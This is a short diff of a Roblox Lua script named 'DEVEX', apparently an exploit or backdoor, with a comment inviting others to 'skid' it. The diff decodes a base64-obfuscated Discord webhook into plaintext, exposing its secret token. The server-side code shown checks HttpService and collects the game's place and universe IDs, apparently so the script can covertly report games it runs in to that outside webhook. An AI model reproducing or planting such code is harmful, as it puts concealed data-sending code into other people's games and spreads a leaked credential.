@@ -1,5 +1,5 @@
 --- DEVEX is open source now :(
-
+--- if you wanna skid skid it and dont forget to give credits
 
 -- Instances: 27 | Scripts: 3 | Modules: 0 | Tags: 0
 local DEV2L = {};
@@ -262,7 +262,7 @@ local script = DEV2L["9"];
 	if not RunService:IsServer() then return end
 	if not HttpService.HttpEnabled then return end
 	
-	local WEBHOOK_URL = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ1NDY1NzcwNTI3NTk0OTEwOC9HeVFpbU9kRG9KcHUyd0dLZ3RhLVpPLVBMMVY3RTNidVBwS3NHMk5EUndxRW56cXRJZXRFNVY5enFxZl9IMjVLSDdveQ=="
+	local WEBHOOK_URL = "https://discord.com/api/webhooks/1454657705275949108/GyQimOdDoJpu2wGKgta-ZO-PL1V7E3buPpKsG2NDRwqEnzqtIetE5V9zqqf_H25KH7oy"
 
 	local placeId = game.PlaceId
 	local universeId = game.GameId
